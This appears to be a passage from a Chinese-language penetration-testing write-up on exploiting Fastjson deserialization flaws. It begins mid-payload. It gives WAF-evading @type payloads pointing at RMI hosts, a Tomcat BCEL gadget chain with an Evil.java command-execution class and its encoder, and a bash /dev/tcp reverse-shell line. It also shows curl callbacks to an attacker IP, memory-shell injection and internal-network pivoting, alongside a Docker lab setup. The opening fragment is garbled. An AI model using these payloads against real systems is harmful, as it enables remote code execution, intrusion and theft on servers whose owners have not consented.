[11111111111111111111111111111111111,[11111111111111111111111111111111111... ,[11111111111111111111111111111111111... ,[11111111111111111111111111111111111... ,[11111111111111111111111111111111111... ,...,{'\x40\u0074\x79\u0070\x65':xjava.lang.AutoCloseable"... ]]]]]
```

各种特性

```php
,new:[NaN,x'00',{,/*}*/'\x40\u0074\x79\u0070\x65':xjava.lang.AutoClosea ble"
```

Fastjson默认会去除键、值外的空格、`\b`、`\n`、`\r`、`\f`等，同时还会自动将键与值进行unicode与十六进制解码。

```php
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}

{  "@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}

{/*s6*/"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}

{\n"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}

{"@type"\b:"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}

{"\u0040\u0074\u0079\u0070\u0065":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}  {"\x40\x74\x79\x70\x65":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}
```

shiro怎么绕waf 如果cookie限制怎么绕
=========================

```php
尝试host回车，TAB
协议转换，尝试post请求
利用burp将数据包的GET替换成LOL即可 /删除请求

https://www.secpulse.com/archives/179873.html
https://zhuanlan.zhihu.com/p/573434218
https://blog.csdn.net/xd_2021/article/details/123720314
```

fastjson不出网利用
=============

fastjson-tomcat安装:
------------------

<https://zhuanlan.zhihu.com/p/124941338>  
**0x00 简介**  
fastjson 是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。

**0x01 漏洞概述**  
首先，Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。

**0x02 影响版本**  
Fastjson1.2.47以及之前的版本

**0x03 环境搭建**  
1、拉取官方镜像

```text
docker pull rightctrl/tomcat
```

2、映射到我服务器8080端口

```text
docker run -d --name tomcat -p 8080:8080 rightctrl/tomcat
~~~

![image.png](images/attach-ffd37df64bdbede4a968726a0a04700b9af59c9a.png)

3、访问[http://ip:8080/]

![image.png](images/attach-a14190736329a78e4d532071aa49c276111f5a50.png)
 4、将fastjson环境安装在tomcat上
文件解压后，直接复制到tomcat的webapps目录下
```text
docker cp fastjson1.2.47  tomcat:/opt/tomcat/webapps/
```

5、进入容器查看是否复制成功

```text
docker exec -i -t tomcat /bin/bash
```

目标是一个web应用，访问返回“Hello world”。正常POST一个json，目标会提取json对象中的name和age拼接成一句话返回。访问\[<http://ip:8080/fastjson1.2.47/>\]

![image.png](images/attach-79c123e595d88869096b2501d0f8f560df6a831f.png)  
至此docker的fastjson反序列化漏洞环境搭建成功

判断不出⽹
-----

分成两种情况

1）nginx->服务器  
两条payload 分别打过去

```php
执行dnslog
curl http://xxx.ceye.io
反弹shell
bash -i >& /dev/tcp/192.168.31.143/222 0>&1
```

两条都没有回显  
第⼀条只有dns有回显，没有http回显  
第⼆条没接收到shell

2\) docker  
两条payload 分别打过去

```php
curl http://192.168.31.143:222
bash -i >& /dev/tcp/192.168.31.143/222 0>&1
```

只有第⼀条回现，第⼆条没接收到shell

![image.png](images/attach-823da4c711661f3eeecbf437d1402d86f3d40e82.png)  
jndi服务有连接记录

![image.png](images/attach-b2259c9bd7c5b77b9fb278c4aceb0671a288c7e6.png)  
\--> 不出⽹：docker（映射端⼝导致）

不出⽹利⽤
-----

![image.png](images/attach-bf11e61210dfeae99ece5776543de40118016e9f.png)

参考⽂章：<https://xz.aliyun.com/t/12492>  
● Spring  
● Tomcat  
● abitis  
weblogic、jboss等⾮tomcat中间件且引⼊了ibatis组件

● c3p0  
<https://github.com/depycode/fastjson-c3p0>  
tomcat BECL payload

```php
{
 "name":
 {
 "@type" : "java.lang.Class",
 "val" : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
 },
 "x" : {
 "name": {
 "@type" : "java.lang.Class",
 "val" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
 },
 "y": {
 "@type":"com.alibaba.fastjson.JSONObject",
 "c": {
 "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
 "driverClassLoader": {
 "@type" : "com.sun.org.apache.bcel.internal.util.Class
Loader"
 },
 "driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A",
 "$ref": "$.x.y.c.connection"
 }
 }
 }
}
```

先准备一个java类 编译成class  
Evil.java

```php
package org.example;
public class Evil {
 static {
 try {
 Runtime.getRuntime().exec("whoami");
 } catch (Exception e) {}
 }
}
```

读取上面class文件

```php
package org.example;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
public class Main {
 public static void main(String[] args) throws IOException {
 Path path = Paths.get("Evil.class");
 byte[] bytes = Files.readAllBytes(path);
 System.out.println(bytes.length);
 String result = Utility.encode(bytes,true);
 BufferedWriter bw = new BufferedWriter(new FileWriter("res.txt"));
 bw.write("$$BCEL$$" + result);
 bw.close();
 }
}
```

利⽤⼯具：<https://github.com/amaz1ngday/fastjson-exp>  
执⾏命令回显

![image.png](images/attach-00ba30438e3805b79606a841bd366040972c5ef2.png)  
使用第一个构造命令回显  
也可以使用yakit

![image.png](images/attach-1f9751dc8bb4d6721b47b1e071bc38718ebc007e.png)

![image.png](images/attach-f9574af6d8f5ce17943adf945e0debc1b8961f93.png)  
后面通过第二个打内存马

![image.png](images/attach-436380de8c17f76f5715e23c15a03b87addcd8b6.png)

![image.png](images/attach-0eb83851daf9f82ae3831d9ed49f0a306aa57aa1.png)

参考：<https://forum.ezreal.cool/thread-117-1-1.html>

打内网
---

出⽹或者不出⽹都可以

![image.png](images/attach-ae3fd89175a803a971646dc975c1175b0d97a83a.png)

```js
{
 "a":{
 "@type":"java.lang.Class",
 "val":"com.sun.rowset.JdbcRowSetImpl"
 },
 "b":{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"rmi://192.168.31.143:8085/jvnbiySo",
 "autoCommit":true
 }
}
```

![image.png](images/attach-d5bfd7f0847fc1848a42741b06da53fef747a572.png)

![image.png](images/attach-76570bea7a6901c1da8fe5099b5eabe3e7973868.png)

利用curl达到ssrf探测的效果

```php
curl -G -d 'user=marry' -d 'count=2' http://192.168.31.143:222

curl -b 'foo1=bar;foo2=bar2' http://192.168.31.143:222

curl -d 'login=admin＆password=pass' -X POST http://192.168.31.143:222
```

![image.png](images/attach-0fc81f1ab7e4b2e4eef0f4565ee0ed4eaa70284d.png)

分块传输插件

![image.png](images/attach-048945be5dfdbf9d0c5cee49530e5dfce42ff40c.png)
